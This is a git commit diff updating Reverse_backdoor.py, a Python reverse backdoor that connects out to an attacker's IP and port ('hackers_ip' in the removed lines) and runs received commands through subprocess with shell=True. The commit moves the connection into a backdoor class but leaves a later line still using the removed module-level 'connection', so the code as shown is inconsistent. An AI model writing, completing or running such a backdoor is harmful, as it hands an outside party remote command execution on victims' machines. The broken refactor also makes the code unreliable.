f4e469fcb757c64c179ab78e336543f5d155acc2
Shivam Singh <dreamyshivam01@gmail.com>
2025-03-28 23:24:46 +0530

    Update Reverse_backdoor.py

--- Reverse_backdoor.py
+++ Reverse_backdoor.py
@@ -1,12 +1,15 @@
 import socket 
 import subprocess
 
+class backdoor:
+    def __init__(self , ip , port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        
+
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-connection.connect(("hackers_ip", open_port_no ))
 
 connection.send("\n[+] Connection established.\n")
 
